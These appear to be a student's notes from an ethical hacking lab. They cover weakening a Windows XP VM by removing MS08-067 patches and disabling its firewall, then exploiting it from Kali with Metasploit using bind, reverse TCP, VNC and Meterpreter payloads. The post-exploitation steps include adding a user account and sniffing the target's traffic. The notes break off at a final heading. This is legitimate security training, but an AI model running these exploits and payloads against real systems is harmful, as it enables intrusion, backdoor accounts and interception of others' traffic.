# EHD Practical 10 - Metasploit

###### tags: #EHD 

## Table of Contents
```toc
```

## Setting Up a Target Vulnerable to MS08-067
**On Host PC**
1. Search the Internet for information about the Microsoft Security Bulletin MS08-067 and take note of the 6-digit knowledge base number
2. For this practical, the WinXP VM  is required

**On WinXP VM**
3. Go to the Control Panel and **Add or Remove Programs**
4. Check the box **Show Updates**. The list of installed programs and software updates will be displayed
5. Search the list of security updates for ones containing the Knowledge Base numbers 958644  or 2705219 of the MS08-067 or MS12-054 security bulletins. If the updates are listed on WinXP, remove them and restart the computer

> If not, WinXP is not patched against the MS08-067 vulnerability

6. Go to the Control Panel > Security Center
7. Under Manage Security Settings, select **Windows Firewall** and turn it off. The WinXP is now a vulnerable target

## Using the Metasploit Console
**On Kali VM**
> <u>Activating the Metasploit console:</u>
> - Click the Kali icon > 08 Exploitation Tools > Metasploit framework
> - Run `msfconsole` on the terminal

- To see all possible commands, type `help` at the `msf` prompt
- To see list of exploits, type `show exploits`
	- List of exploits and CVE numbers will be displayed
- To search for exploits related to SMB, type `search smb`
- To search for exploits related to MS08-067, type `search ms08_067`

1. Look for info on the exploit `ms08_067_netapi` and use it
```
info windows/smb/ms08_067_netapi
use windows/smb/ms08_067_netapi
```
2. At the exploit prompt, type `show options`
3. Set a remote host to target (RHOST)
```
set RHOST WinXP-IP
```
4. Type `show options` to view the RHOST set
5. To check which payloads can be used for a certain exploit, type the following command:
```
show payloads
```
6. View info on the payload `windows/shell/bind_tcp` and set it:
```
info windows/shell/bind_tcp
set windows/shell/bind_tcp
```
7. Type `show options` to view the options set for the payload
8. Run the exploit:
```
exploit
```

> If the exploit is successful, a remote connection will be established to the command prompt of the Windows XP VM
> - Run `dir` to list all files on the remote target
> - Type `set` to see list of current environment variables
> - To create a new user: `net user username password /add`

9. To quit from the remote connection, press <kbd>Ctrl</kbd>+<kbd>C</kbd>

## Using Reverse TCP Payload
> In the previous exploit, Kali creates a connection to the unpatched WinXP, but if the firewall on WinXP is enabled, Kali is unable to connect to WinXP
> To address this problem, the payload `reverse_tcp` tells the victim to connect to the attacker (Kali VM) as WinXP as WinXP is the one initiating the connection, hence the firewall will allow it

**On Kali VM**
1. Set the payload to `reverse_tcp`
```
set payload windows/shell/reverse_tcp
```
2. Type`show options` to see the options set
3. Specify the listening host (LHOST) that the victim should connect to
```
set LHOST Kali-IP
```
4. Run the exploit:
```
exploit
```

**On WinXP VM**
5.  On the Command Prompt, type the following to <u>view the connection Metasploit has made to the attacker system:</u>
```
netstat -an
```

## Using VNC Payload
**On Kali VM**
1. Try the exploit with the following payload:
```
set payload windows/vncinject/reverse_tcp
```
2. Type `show options` to see options set
3. Run the exploit
```
exploit
```

## Using Meterpreter
**On Kali VM**
1. Try the exploit with the following payload:
```
set payload windows/meterpreter/reverse_tcp
```
2. Type  `show options` to see options set
3. Run the exploit
```
exploit
```
4. Type `help` at the Meterpreter prompt to see all available commands
5. Type `ps` to see list of processes running on the WinXP VM
6. Type `screenshot` to take a screenshot of the WinXP VM (File is saved to a file on Kali)
7. Type `ifconfig` to list the network interfaces on the WinXP VM
8. To see all possibilities for Meterpreter scripts on Kali, type `run` and press <kbd>Tab</kbd> twice
9. To see all possibilities for Meterpreter extension modules on Kali, type `use` and press <kbd>Tab</kbd> twice
10. Type `use sniffer` to load the load the sniffer extension to do network packet capturing on the WinXP VM
11. Type `sniffer_start 2` (where 2 is the interface number of the VMWare network adapter)

**On WinXP VM**
12. Do some network activity e.g. pinging another system or browsing the Internet

**On Kali VM**
13. Type `sniffer_stats 2` to see statistics on the number of packets and bytes captured so far
14. Type `sniffer_dump 2 /tmp/winxp.cap` to save the captured packets into a file `/tmp/winxp.cap`
15. View the captured packet file using Wireshark

## Use Metasploit M